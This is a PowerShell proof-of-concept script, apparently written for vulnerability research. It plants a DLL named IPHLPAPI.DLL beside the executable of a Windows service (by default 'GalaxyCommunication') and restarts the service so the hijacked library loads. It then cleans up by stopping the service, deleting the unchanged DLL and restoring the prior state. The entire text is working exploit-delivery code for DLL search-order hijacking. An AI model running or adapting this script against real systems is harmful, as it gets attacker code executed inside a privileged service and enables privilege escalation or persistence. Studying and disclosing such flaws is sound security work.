param(
    [string]$ServiceName = 'GalaxyCommunication',
    [string]$DllName = 'IPHLPAPI.DLL',
    [int]$TimeoutSeconds = 10
)

$ErrorActionPreference = 'Stop'

function Wait-ServiceState {
    param(
        [string]$Name,
        [string]$State
    )

    $deadline = [DateTime]::UtcNow.AddSeconds($TimeoutSeconds)
    do {
        if ((Get-Service -Name $Name).Status.ToString() -eq $State) {
            return
        }
        Start-Sleep -Milliseconds 200
    } while ([DateTime]::UtcNow -lt $deadline)

    throw "Service '$Name' did not reach state '$State' within $TimeoutSeconds seconds."
}

$serviceKey = "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\$ServiceName"
$imagePath = [Environment]::ExpandEnvironmentVariables(
    [string](Get-ItemProperty -LiteralPath $serviceKey).ImagePath
)

if ($imagePath -match '^\s*"([^"]+)"') {
    $serviceExecutable = $Matches[1]
} elseif ($imagePath -match '^\s*(.+?\.exe)(?=\s|$)') {
    $serviceExecutable = $Matches[1]
} else {
    throw "Unable to parse service ImagePath: $imagePath"
}

$sourceDll = Join-Path $PSScriptRoot $DllName
$targetDll = Join-Path (Split-Path -Parent $serviceExecutable) $DllName
$originalState = (Get-Service -Name $ServiceName).Status.ToString()
$sourceHash = $null
$deployed = $false

if (-not (Test-Path -LiteralPath $sourceDll)) {
    throw "PoC DLL not found: $sourceDll"
}
if (Test-Path -LiteralPath $targetDll) {
    throw "Refusing to overwrite existing file: $targetDll"
}

try {
    if ($originalState -eq 'Running') {
        & sc.exe stop $ServiceName | Out-Null
        Wait-ServiceState -Name $ServiceName -State Stopped
    }

    Copy-Item -LiteralPath $sourceDll -Destination $targetDll
    $deployed = $true
    $sourceHash = (Get-FileHash -LiteralPath $sourceDll -Algorithm SHA256).Hash

    & sc.exe start $ServiceName | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "Unable to start $ServiceName."
    }
    Start-Sleep -Seconds 2
}
finally {
    if ((Get-Service -Name $ServiceName -ErrorAction SilentlyContinue).Status -ne 'Stopped') {
        & sc.exe stop $ServiceName | Out-Null
        Wait-ServiceState -Name $ServiceName -State Stopped
    }

    if ($deployed -and (Test-Path -LiteralPath $targetDll)) {
        if ((Get-FileHash -LiteralPath $targetDll -Algorithm SHA256).Hash -eq $sourceHash) {
            Remove-Item -LiteralPath $targetDll -Force
        } else {
            Write-Warning "The deployed DLL changed and was left in place: $targetDll"
        }
    }

    if ($originalState -eq 'Running') {
        & sc.exe start $ServiceName | Out-Null
        Wait-ServiceState -Name $ServiceName -State Running
    }
}
